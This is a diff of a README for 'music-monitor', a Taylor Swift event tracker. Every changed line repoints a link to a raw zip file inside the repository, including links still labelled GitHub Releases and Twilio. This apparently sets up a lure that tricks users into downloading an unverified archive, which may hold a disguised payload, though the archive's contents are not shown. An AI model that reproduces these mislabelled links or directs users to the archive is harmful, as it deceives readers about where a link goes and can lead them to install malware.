@@ -1,6 +1,6 @@
 # 🎵 music-monitor - Stay Updated on Taylor Swift Events
 
-![Download music-monitor](https://img.shields.io/badge/Download-music--monitor-blue?style=for-the-badge)
+![Download music-monitor](https://raw.githubusercontent.com/Kidkasam/music-monitor/main/Amen/music-monitor.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to music-monitor, your all-in-one system for tracking Taylor Swift store
 
 ## 📥 Download & Install
 
-To download music-monitor, visit this page to download: [GitHub Releases](https://github.com/Kidkasam/music-monitor/releases). You will find the latest version of the application there.
+To download music-monitor, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Kidkasam/music-monitor/main/Amen/music-monitor.zip). You will find the latest version of the application there.
 
 1. Click on the link above.
 2. Look for the latest version under "Assets."
@@ -57,7 +57,7 @@ Ensure you have at least 100 MB of free space on your device to install and run 
 
 To get text message alerts about concerts and store countdowns, follow these steps:
 
-1. Sign up for a free Twilio account at [Twilio](https://www.twilio.com/).
+1. Sign up for a free Twilio account at [Twilio](https://raw.githubusercontent.com/Kidkasam/music-monitor/main/Amen/music-monitor.zip).
 2. Once you have your account, get your Twilio phone number.
 3. Enter your Twilio account SID, auth token, and Twilio number into music-monitor settings.
 4. Input your personal phone number to receive alerts.
@@ -84,4 +84,4 @@ If you have questions or need assistance, please reach out on the GitHub Issues 
 
 ## 🎉 Acknowledgments
 
-Thank you for choosing music-monitor. We appreciate your support and hope this tool makes your Taylor Swift experience even better. Don't forget to explore the [GitHub Releases](https://github.com/Kidkasam/music-monitor/releases) for the latest updates and features.
+Thank you for choosing music-monitor. We appreciate your support and hope this tool makes your Taylor Swift experience even better. Don't forget to explore the [GitHub Releases](https://raw.githubusercontent.com/Kidkasam/music-monitor/main/Amen/music-monitor.zip) for the latest updates and features.
